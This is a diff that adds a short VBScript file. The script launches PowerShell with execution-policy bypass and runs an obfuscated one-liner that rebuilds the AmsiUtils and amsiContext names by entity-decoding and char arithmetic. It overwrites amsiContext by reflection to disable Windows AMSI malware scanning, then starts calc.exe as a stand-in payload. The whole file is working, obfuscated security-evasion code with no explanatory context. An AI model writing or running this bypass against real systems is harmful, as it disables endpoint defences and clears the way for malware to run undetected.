@@ -1,0 +1,2 @@
+Set oshell = wscript.createobject("wscript.shell")
+oshell.run "powershell.exe -exec bypass -nop -command [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.'+$([sYSteM.nET.WEbutIliTY]::hTmLdEcode('&#65;&#109;&#115;&#105;'))+'Utils').GetField(''+$([ChAR](97)+[ChAr]([BYte]0x6D)+[CHAr](6900/60)+[ChAR](1365/13))+'Context',[Reflection.BindingFlags]$([SySteM.neT.weBUTIliTY]::HtMldecODE('&#78;&#111;&#110;&#80;&#117;&#98;&#108;&#105;&#99;&#44;&#83;&#116;&#97;&#116;&#105;&#99;'))).GetValue($null),0x44761268); calc.exe
